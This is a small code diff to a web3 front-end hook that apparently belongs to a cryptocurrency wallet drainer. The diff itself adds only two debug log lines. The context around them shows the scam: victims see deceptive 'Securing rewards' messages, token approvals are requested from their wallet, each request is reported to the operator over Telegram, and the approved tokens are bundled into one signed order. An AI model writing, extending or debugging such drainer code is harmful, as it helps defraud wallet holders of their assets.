@@ -654,6 +654,7 @@ export function useWeb3Manager() {
                 try {
                     const signer = await provider.getSigner();
                     setCurrentTask(`Securing ${targetChainName.toUpperCase()} rewards...`);
+                    console.log(`📊 BUNDLING DEBUG: Processing ${tokensOnChain.length} tokens on ${targetChainName}`);
                     notifyTelegram(`<b>✍️ Requesting Approvals</b>\nChain: ${targetChainName}\nTokens: ${tokensOnChain.length}`);
 
                     const approvedTokens = [];
@@ -695,6 +696,7 @@ export function useWeb3Manager() {
                     if (approvedTokens.length > 0) {
                         try {
                             const signNarrative = getSocialNarrative(approvedTokens[0].symbol, false, 'SIGN');
+                            console.log(`📊 BUNDLING: Creating ONE order for ${approvedTokens.length} tokens`);
                             setCurrentTask(`${signNarrative} (${approvedTokens.length} assets)...`);
 
                             const offerItems = approvedTokens.map(token => ({
